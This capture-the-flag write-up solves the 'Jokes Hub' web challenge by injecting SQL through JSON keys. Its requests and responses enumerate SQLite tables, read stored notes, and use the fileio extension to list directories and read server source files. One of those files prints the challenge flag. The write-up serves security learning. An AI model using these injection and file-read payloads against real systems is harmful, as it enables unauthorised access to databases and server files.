# TIJokes Hub

## Description

> It can even do more interesting things. Note: Same link as last challenge.
>
> https://jokes-hub-1.bsides.shellmates.club

## Write-Up

Continuing with the Jokes Hub challenge, let's try to explore more the database and what does it hide.

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 73
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"sql FROM sqlite_master WHERE type = 'table' AND name LIKE 'n%';--":100}
```

Where the The % symbol is a wildcard character that matches any sequence of zero or more characters. So 'n%' matches any string that starts with the letter 'n', followed by any sequence of characters.

This query help extract tables available using all alphabetic letter from a-z. From there we get for `n` value :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 06:52:54 GMT
content-type: application/json
content-length: 119
connection: close

{"result":"CREATE TABLE notes\n                 (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                  note TEXT)"}
```

For `s` value :

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 06:54:42 GMT
content-type: application/json
content-length: 52
connection: close

{"result":"CREATE TABLE sqlite_sequence(name,seq)"}
```

Or like this :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Accept-Language: en-US,en;q=0.9
Connection: close

{"sql FROM sqlite_master LIMIT 100 OFFSET 3;--":100}
```

By modifying the offset each time, we find that there is 4 databases ;

 - jokes
 - notes
 - flags
 - sqlite_sequence

Now, let's checkout the notes in the `notes` db :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 26
...
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"note from notes;--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 07:01:40 GMT
content-type: application/json
content-length: 42
connection: close

{"result":"Add function to upload jokes"}
```

this is for the first note, for the second one :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
...
Connection: close

{"note from notes LIMIT 200 OFFSET 1;--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 07:18:39 GMT
content-type: application/json
content-length: 50
connection: close

{"result":"Use prepaired queries instead of the"}
```

From there, by changing the offset, we get the following notes :

 - Add function to upload jokes
 - Use prepaired queries instead of the unload fileio from the production server


For the first note, it seems that we need to look for an upload function for jokes and see what can we use about it.

As for the second note, This note is likely referring to a security concern related to handling user input in an API that serves jokes and punchlines. It is advising the developer to use prepared queries instead of directly using user input to construct SQL queries, and to avoid executing arbitrary SQL code from user input on the production server

On the other hand, the note is warning against using "unload fileio" on the production server. This could refer to a technique where SQL queries are constructed dynamically by reading them from a file or other external source, rather than using prepared queries. This approach can be dangerous because it may allow an attacker to inject arbitrary SQL code into the query by manipulating the contents of the file or other external source.

After searching for sqlite, flieio, and sql injection, we found the following :

> fileio: Read and Write Files in SQLite
> 
> Access the file system directly from SQL. Partly based on the fileio.c by D. Richard Hipp.

This is a set of functions that help us check and read files. So let's try few things :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 60
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
...
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"name from fileio_ls('.', true) LIMIT 200 OFFSET 1;--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 08:11:18 GMT
content-type: application/json
content-length: 23
connection: close

{"result":"./wsgi.py"}
```

Also, testing each offset, we get :

 - .
 - ..
 - ./wsgi.py
 - ./jokes.txt
 - ./app.py
 - ./app.ini
 - ./requirements.txt
 - ./db.py
 - ./fileio.so
 - ./static
 - ./templates
 - ./notes.txt

Let's also explore parent directories :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 60
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
...
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"name from fileio_ls('..', true) LIMIT 200 OFFSET 1;--":100}
```

We get :

 - ../flagger
 - ../flagger/wsgi.py
 - ../flagger/flagger.py
 - ../flagger/flagger.ini

Now, we need to read the files, but unfortunatly, when using `fileio_read()` function, it returns a blob and bytes instead of strings. And since we cannot do script, we need to do the decoding to `utf-8` that in the query like the following :

```
SELECT CAST(fileio_read('myfile.txt') AS TEXT ENCODING 'utf-8');

```

From there, we do :

```
POST /jokes HTTP/1.1
Host: jokes-hub-1.bsides.shellmates.club
Content-Length: 78
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://jokes-hub-1.bsides.shellmates.club
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://jokes-hub-1.bsides.shellmates.club/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"CAST(fileio_read('../flagger/flagger.py') AS TEXT ENCODING 'utf-8');--":100}
```

```
HTTP/1.1 200 OK
server: nginx/1.22.0 (Ubuntu)
date: Sat, 06 May 2023 08:32:30 GMT
content-type: application/json
content-length: 550
connection: close

{"result":"from flask import Flask, request\nimport os\n\n#shellmates{it5_l1k3_5q1i73_0n_573r01d5}\n\nflagger = Flask(__name__)\n\nSECRET = os.getenv(\"SECRET\")\n\n@flagger.route('/getFlag/<secret>', methods=['GET'])\ndef getFlag(secret):\n    if secret == SECRET:\n        return os.popen(\"/flag\").read()\n    return \"Wrong secret\"\n\n@flagger.route('/fileReader/', methods=['GET'])\ndef getFile():\n    file = request.args.get(\"file\",\"\")\n    if os.path.exists(file):\n        return open(file).read()\n    return \"File doesn't exist\""}
```

Which contains the flag directly.


## Flag

shellmates{it5_l1k3_5q1i73_0n_573r01d5}

## More Information

 - https://github.com/nalgeon/sqlean/blob/main/docs/fileio.md
 - https://antonz.org/sqlean-fileio/
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
